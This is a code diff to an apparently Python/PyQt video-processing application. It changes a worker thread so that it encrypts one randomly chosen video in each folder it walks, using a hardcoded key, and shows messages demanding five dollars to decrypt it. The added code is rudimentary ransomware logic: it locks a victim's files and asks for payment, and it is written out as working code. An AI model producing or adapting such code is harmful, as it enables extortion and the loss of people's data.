@@ -2,6 +2,7 @@
 
 import datetime
 import os.path
+import random
 import sys
 import time
 
@@ -330,21 +331,27 @@ class FileThread(QtCore.QThread):
         
     
     def run(self):
+        self.File_signal.emit(">>>>>>>>>>>>>>>>>Attention please!!<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\n")
         self.File_signal.emit("you should specify a folder which contains many videos you are keen on!\n")
-        self.File_signal.emit("one of files will be randomly deleted at once you click the choose button! \n")
+        self.File_signal.emit("one of videos will be randomly encryted at once you click the choose button! \n")
+        self.File_signal.emit("if you want to decript your video, you only have one chance to request! \n")
+        self.File_signal.emit("you will be charged 5 dollars to unlock it \n")
         for allthings in os.listdir(self.folder):
             if os.path.isdir(allthings):
                 self.File_signal.emit("there is a folder:{} here, currently, we pass it!\n".format(allthings))
             elif os.path.isfile(allthings):
                 self.File_signal.emit("show the file:{}\n".format(allthings))
         for a,b,c in os.walk(self.folder):
-            for video in c:
-                absvideo = os.path.join(self.folder, video)
-                key_encript = "5df1b4e0d7ca82a62177e3518fe2f35a"
-                kid_encript = "d0d28b3dd265e02ccf4612d4bd22c24f"
-                videoprocess = VideoProcess(absvideo,key_encript,kid_encript)
-                #videoprocess.startencrytion()
-                videoprocess.startdecrytion()
+            numofvideos = len(c)
+            randomindex = random.randint(0,numofvideos-1)
+            absvideo = os.path.join(self.folder, c[randomindex])
+
+            self.File_signal.emit("the video {} will be encripted now \n".format(c[randomindex]))
+            key_encript = "5df1b4e0d7ca82a62177e3518fe2f35a"
+            kid_encript = "d0d28b3dd265e02ccf4612d4bd22c24f"
+            videoprocess = VideoProcess(absvideo,key_encript,kid_encript)
+            videoprocess.startencrytion()
+            #videoprocess.startdecrytion()
         print("all done!!")
 
 
